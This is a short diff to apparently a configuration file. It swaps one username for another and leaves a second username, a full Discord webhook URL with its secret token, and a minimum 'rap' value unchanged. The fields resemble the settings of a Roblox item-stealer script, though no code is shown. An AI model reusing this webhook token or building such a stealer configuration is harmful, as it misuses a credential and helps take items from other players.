@@ -1,4 +1,4 @@
-Username = "itsellis12345678910"
+Username = "adoptmelifecool1"
 Username2 = "itsellis12345678910"
 Webhook = "https://discord.com/api/webhooks/1244255093486780448/kKGH6-jDmf8x40aG1ySexoELfUv0KPXAVMembqX9ev4Ww_3_SmboEUKs2-gtqmEyCEMO"
 min_rap = 20000
